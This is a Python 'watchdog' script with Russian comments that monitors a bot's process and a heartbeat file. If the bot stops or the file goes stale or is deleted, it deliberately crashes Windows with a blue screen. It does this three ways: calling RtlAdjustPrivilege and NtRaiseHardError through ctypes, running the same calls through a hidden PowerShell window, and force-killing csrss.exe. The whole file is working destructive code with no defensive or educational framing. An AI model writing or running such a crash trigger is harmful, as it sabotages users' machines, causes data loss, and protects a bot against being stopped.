"""
Watchdog процесс для критического режима
Работает независимо от основного бота
"""
import os
import sys
import time
import ctypes
import subprocess
import psutil

def trigger_bsod():
    """Вызывает BSOD (синий экран смерти)"""
    print("💀💀💀 WATCHDOG: ВЫЗОВ BSOD! 💀💀💀")
    
    # Метод 1: ntdll.dll
    try:
        ntdll = ctypes.windll.ntdll
        enabled = ctypes.c_bool()
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(enabled))
        ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
    except Exception as e:
        print(f"Метод 1 failed: {e}")
    
    # Метод 2: PowerShell BSOD
    try:
        ps_script = '''
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class BSOD {
    [DllImport("ntdll.dll")]
    public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
    
    public static void Trigger() {
        bool t1;
        uint t2;
        RtlAdjustPrivilege(19, true, false, out t1);
        NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
    }
}
"@
[BSOD]::Trigger()
'''
        subprocess.run(["powershell", "-Command", ps_script], creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        print(f"Метод 2 failed: {e}")
    
    # Метод 3: Убить критический процесс
    try:
        subprocess.run(["taskkill", "/F", "/IM", "csrss.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def main():
    if len(sys.argv) < 3:
        print("Usage: watchdog.py <pid> <heartbeat_file>")
        sys.exit(1)
    
    bot_pid = int(sys.argv[1])
    heartbeat_file = sys.argv[2]
    
    print(f"🔴 WATCHDOG запущен!")
    print(f"   Мониторинг PID: {bot_pid}")
    print(f"   Heartbeat файл: {heartbeat_file}")
    print(f"   Watchdog PID: {os.getpid()}\n")
    
    last_check_ok = True
    
    while True:
        try:
            # Проверка 1: Существует ли процесс
            if not psutil.pid_exists(bot_pid):
                print(f"❌ ПРОЦЕСС {bot_pid} НЕ НАЙДЕН!")
                if not last_check_ok:
                    trigger_bsod()
                    break
                last_check_ok = False
            else:
                last_check_ok = True
            
            # Проверка 2: Heartbeat файл существует и обновляется
            if os.path.exists(heartbeat_file):
                try:
                    with open(heartbeat_file, 'r') as f:
                        file_time = float(f.read())
                        current_time = time.time()
                        age = current_time - file_time
                        
                        if age > 10:  # 10 секунд без обновления
                            print(f"❌ HEARTBEAT ИСТЁК! ({age:.1f} сек)")
                            trigger_bsod()
                            break
                        else:
                            print(f"✅ Heartbeat OK ({age:.1f} сек назад)")
                except Exception as e:
                    print(f"⚠️ Ошибка чтения heartbeat: {e}")
            else:
                print(f"❌ HEARTBEAT ФАЙЛ УДАЛЁН!")
                trigger_bsod()
                break
                
        except Exception as e:
            print(f"⚠️ Ошибка: {e}")
        
        time.sleep(2)  # Проверка каждые 2 секунды

if __name__ == "__main__":
    main()
